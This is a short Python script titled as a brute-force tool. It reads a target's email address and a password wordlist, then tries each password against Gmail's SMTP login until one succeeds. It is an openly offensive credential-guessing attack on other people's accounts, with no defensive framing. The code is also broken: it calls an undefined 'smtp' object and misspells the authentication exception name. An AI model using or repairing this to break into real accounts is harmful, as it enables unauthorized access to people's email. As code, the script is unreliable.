#Brute force
import smtplib

smtpserver= smtplib.SMTP('smtp.gmail.com',587)
smtpserver.ehlo()
smtpserver.starttls()

user=raw_input("Enter the target's email addres: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile,'r')

for password in passwfile:
    try:
        smtp.login(user,password)
        print(('Password Found : {}').format(password))
        break ;
    except smtplib.SMTPAutcheticationError:
        print(('Password Incorect:{}').format(password))
